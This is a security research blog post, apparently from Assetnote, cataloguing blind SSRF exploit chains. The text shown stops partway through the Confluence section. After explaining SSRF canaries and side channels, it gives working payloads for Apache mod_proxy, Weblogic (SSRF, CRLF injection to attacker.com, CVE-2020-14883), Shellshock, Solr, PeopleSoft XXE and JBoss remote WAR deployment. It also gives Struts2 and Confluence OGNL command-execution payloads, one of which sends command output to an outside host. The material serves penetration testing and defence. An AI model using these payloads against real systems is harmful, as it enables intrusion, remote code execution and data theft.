---
source: assetnote
source_url: https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
title: "A Glossary of Blind SSRF Chains – Assetnote"
author: "Assetnote Team"
description: "Application security issues found by Assetnote"
---

[← Back to Blog](https://blog.assetnote.io/)

# A Glossary of Blind SSRF Chains

Jan 13, 2021

| ![](https://blog.assetnote.io/images/blind-ssrf-chains.png) |
| --- |
|  |

# Introduction

## What is Server Side Request Forgery (SSRF)?

Server Side Request Forgery occurs when you can coerce a server to make arbitrary requests on your behalf. As the requests are being made by the server, it may be possible to access internal resources due to where the server is positioned in the network. On cloud environments, SSRF poses a more significant risk due to the presence of [metadata endpoints](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b) that may contain sensitive credentials or secrets.

## Blind SSRF

When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as “Blind SSRF”. In such situations, how do we prove impact? This was an interesting discussion that was sparked by Justin Gardner on Twitter:

Twitter Embed

> I've been finding a large amount of Blind SSRFs recently. What kind of one-shot RCE's have you guys used as pivots for these in the past? I've got access to some Kafka and a bunch of other things. [@nnwakelam](https://twitter.com/nnwakelam?ref_src=twsrc%5Etfw) [@thedawgyg](https://twitter.com/thedawgyg?ref_src=twsrc%5Etfw)
>
> — Justin Gardner (@Rhynorater) [January 13, 2021](https://twitter.com/Rhynorater/status/1349290375312154625?ref_src=twsrc%5Etfw)

If you can reach internal resources, there are a number of potential exploit chains that can be executed to prove impact. This blog post attempts to go into detail for each known exploit chain when leveraging blind SSRF, and will be updated as more techniques are discovered and shared.

You can find a GitHub repo with all of these techniques here: [Blind SSRF Chains](https://github.com/assetnote/blind-ssrf-chains).

Please send us a pull request on GitHub if you would like any more techniques to be added to this glossary.

## SSRF Canaries

Twitter Embed

> I tend to call them SSRF canaries, when chaining a blind SSRF to another SSRF internally which makes an additional call externally, or by an app-specific open redir or blind XXE. Confluence, Artifactory, Jenkins and JAMF have some that works well.
>
> — Frans Rosén (@fransrosen) [January 13, 2021](https://twitter.com/fransrosen/status/1349397387920502786?ref_src=twsrc%5Etfw)

In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”.

This is when we can request an internal URL that performs another SSRF and calls out to your canary host. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.

This is an effective way to verify that an SSRF vulnerability has access to a internal networks or applications, and to also verify the presence of certain software existing on the internal network. You can also potentially pivot to more sensitive parts of an internal network using an SSRF canary, depending on where it sits.

## Using DNS datasources and AltDNS to find internal hosts

With the goal being to find as many internal hosts as possible, DNS datasources can be utilised to find all records that point to internal hosts.

On cloud environments, we often see ELBs that are pointing to hosts inside an internal VPC. Depending on which VPC the asset you’re targeting is in, it may be possible to access other hosts within the same VPC.

For example, consider the following host has been discovered from DNS datasources:

```bash
livestats.target.com -> internal-es-livestats-298228113.us-west-2.elb.amazonaws.com -> 10.0.0.82
```

You can make an assumption that the `es` stands for Elasticsearch, and then perform further attacks on this host. You can also spray all of these blind SSRF payloads across all of the “internal” hosts that have been identified through this method. This is often effective.

To find more internal hosts, I recommend taking all of your DNS data and then using something like [AltDNS](https://github.com/infosec-au/altdns) to generate permutations and then resolve them with a [fast DNS bruteforcer](https://github.com/blechschmidt/massdns).

Once this is complete, identify all of the newly discovered internal hosts and use them as a part of your blind SSRF chain.

## Side Channel Leaks

When exploiting blind SSRF vulnerabilities, you may be able to leak some information about the response being returned. For example, let’s say that you have blind SSRF via an XXE, the error messages may indicate whether or not:

- A response was returned

`Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.`

vs.

- Host and port are unreachable

`Error parsing request: System.Net.WebException: Unable to connect to the remote server`

Similarly, outside of XXEs, a web application could also have a side channel leak that can be ascertained by inspecting differences within the:

- **Response status code**:

Online internal asset:port responds with `200 OK` vs offline internal asset:port `500 Internal Server Error`

- **Response contents**:

The response size in bytes is smaller or bigger depending on whether or not the URL you are trying to request is reachable.

- **Response timing**:

The response times are slower or faster depending on whether or not the URL you are trying to request is reachable.

* * *

# Techniques

**Possible via HTTP(s)**

- [Apache mod\_proxy](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#modproxy)
- [Elasticsearch](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#elasticsearch)
- [Weblogic](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#weblogic)
- [Hashicorp Consul](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#consul)
- [Shellshock](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#shellshock)
- [Apache Druid](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#druid)
- [Apache Solr](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#solr)
- [PeopleSoft](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#peoplesoft)
- [Apache Struts](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#struts)
- [JBoss](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jboss)
- [Confluence](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#confluence)
- [Jira](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jira)
- [Other Atlassian Products](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#atlassian-products)
- [OpenTSDB](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#opentsdb)
- [Jenkins](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jenkins)
- [Hystrix Dashboard](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#hystrix)
- [W3 Total Cache](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#w3)
- [Docker](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#docker)
- [Gitlab Prometheus Redis Exporter](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#redisexporter)

**Possible via Gopher**

- [Redis](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#redis)
- [Memcache](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#memcache)
- [Apache Tomcat](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#tomcat)

**Tools**

- [Gopherus](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#gopherus)
- [SSRF Proxy](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#ssrfproxy)

* * *

**Possible via HTTP(s)**

## Apache mod\_proxy

**Commonly bound port: 80,443**

**SSRF Canary: Apache mod\_proxy SSRF (CVE-2021-40438)**

Affects Apache <= 2.4.48.

A reference for this bug can be found here: [https://firzen.de/building-a-poc-for-cve-2021-40438](https://firzen.de/building-a-poc-for-cve-2021-40438).

```http
/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://SSRF_CANARY/
```

## Weblogic

**Commonly bound ports: 80, 443 (SSL), 7001, 8888**

**SSRF Canary: UDDI Explorer (CVE-2014-4210)**

```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

This also works via GET:

```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

This endpoint is also vulnerable to CRLF injection:

```http
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
```

Will result in the following request:

```http
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```

**SSRF Canary: CVE-2020-14883**

Taken from [here](https://forum.90sec.com/t/topic/1412).

Linux:

```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```

Windows:

```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```

## Hashicorp Consul

**Commonly bound ports: 8500, 8501 (SSL)**

Writeup can be found [here](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html).

## Shellshock

**Commonly bound ports: 80, 443 (SSL), 8080**

In order to effectively test for Shellshock, you may need to add a header containing the payload. The following CGI paths are worth trying:

Short list of CGI paths to test:

[Gist containing paths](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4).

**SSRF Canary: Shellshock via User Agent**

```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```

## Apache Druid

**Commonly bound ports: 80, 8080, 8888, 8082**

See the API reference for Apache Druid [here](https://druid.apache.org/docs/latest/operations/api-reference.html).

If you can view the status code, check the following paths to see if they return a 200 status code:

```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```

Shutdown tasks, requires you to guess task IDs or the datasource name:

```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```

Shutdown supervisors on Apache Druid Overlords:

```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```

## Apache Solr

**Commonly bound port: 8983**

**SSRF Canary: Shards Parameter**

Twitter Embed

> To add to what shubham is saying - scanning for solr is relatively easy. There is a shards= param which allows you to bounce SSRF to SSRF to verify you are hitting a solr instance blindly.
>
> — Хавиж Наффи 🥕 (@nnwakelam) [January 13, 2021](https://twitter.com/nnwakelam/status/1349298311853821956?ref_src=twsrc%5Etfw)

Taken from [here](https://github.com/veracode-research/solr-injection).

```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```

**SSRF Canary: Solr XXE (2017)**

[Apache Solr 7.0.1 XXE (Packetstorm)](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)

```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```

**RCE via dataImportHandler**

[Research on RCE via dataImportHandler](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**Commonly bound ports: 80,443 (SSL)**

Taken from this research [here](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).

**SSRF Canary: XXE #1**

```http
POST /PSIGW/HttpListeningConnector HTTP/1.1

...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [\
<!ENTITY x SYSTEM "http://SSRF_CANARY">\
]>
<IBRequest>
   <ExternalOperationName>&x;</ExternalOperationName>
   <OperationType/>
   <From><RequestingNode/>
      <Password/>
      <OrigUser/>
      <OrigNode/>
      <OrigProcess/>
      <OrigTimeStamp/>
   </From>
   <To>
      <FinalDestination/>
      <DestinationNode/>
      <SubChannel/>
   </To>
   <ContentSections>
      <ContentSection>
         <NonRepudiation/>
         <MessageVersion/>
         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
         </Data>
      </ContentSection>
   </ContentSections>
</IBRequest>
```

**SSRF Canary: XXE #2**

```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1

...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```

## Apache Struts

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

Taken from [here](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF Canary: Struts2-016**:

Append this to the end of every internal endpoint/URL you know of:

```http

?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```

## JBoss

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

Taken from [here](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF Canary: Deploy WAR from URL**

```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```

## Confluence

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

**RCE via OGNL Injection (CVE-2021-26084)**

```bash
/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
